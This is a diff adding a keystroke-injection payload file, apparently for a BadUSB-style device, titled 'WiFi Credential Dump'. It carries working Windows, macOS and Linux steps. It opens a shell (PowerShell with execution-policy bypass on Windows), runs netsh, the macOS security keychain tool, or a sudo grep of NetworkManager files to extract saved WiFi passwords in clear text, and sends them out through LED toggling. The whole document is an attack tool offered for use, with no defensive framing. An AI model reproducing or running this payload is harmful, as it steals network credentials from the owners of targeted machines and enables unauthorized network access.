@@ -1,0 +1,26 @@
+NAME WiFi Credential Dump
+DESCRIPTION Extracts saved WiFi passwords; exfils output via LED toggling
+CATEGORY credential
+PLATFORMS WIN,MAC,LINUX
+OPTION DELAY 2000 "Initial HID enumeration delay (ms)"
+PLATFORM WIN
+DELAY {{DELAY}}
+GUI r
+DELAY 800
+STRING powershell -nop -ep bypass
+ENTER
+DELAY 1200
+EXFIL (netsh wlan show profiles) | Select-String '\:(.+)$' | %{$n=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String 'Key Content\W+\:(.+)$' | %{"WIFI: $n = " + $_.Matches.Groups[1].Value.Trim()}
+PLATFORM MAC
+DELAY {{DELAY}}
+GUI SPACE
+DELAY 700
+STRING Terminal
+ENTER
+DELAY 1400
+EXFIL for ssid in $(networksetup -listpreferredwirelessnetworks en0 | tail -n +2 | tr -d ' '); do pw=$(security find-generic-password -wa "$ssid" 2>/dev/null); echo "WIFI: $ssid = $pw"; done
+PLATFORM LINUX
+DELAY {{DELAY}}
+CTRL ALT t
+DELAY 1400
+EXFIL sudo grep -rH psk= /etc/NetworkManager/system-connections/ 2>/dev/null || nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk connection show 2>/dev/null | sed 's/:/: /'
